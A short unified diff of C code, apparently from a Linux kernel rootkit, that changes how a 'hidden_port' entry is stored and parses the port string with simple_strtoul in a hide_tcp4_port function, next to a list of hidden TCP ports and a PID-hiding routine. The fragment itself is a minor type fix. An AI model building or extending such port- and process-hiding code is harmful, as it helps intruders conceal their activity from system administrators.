@@ -416,7 +416,8 @@ void pid_remove_all(void)
 // ========== PORT LIST ==========
 
 struct hidden_port {
-    unsigned short port;
+    //unsigned short port;
+    unsigned long port;
     struct list_head list;
 };
 
@@ -431,7 +432,8 @@ void hide_tcp4_port(const char *port)
     if ( ! hp )
         return 0;
 
-    hp->port = port;
+    //hp->port = port;
+    hp->port = simple_strtoul(port, NULL, 10);
 
     list_add(&hp->list, &hidden_tcp4_ports);
 	
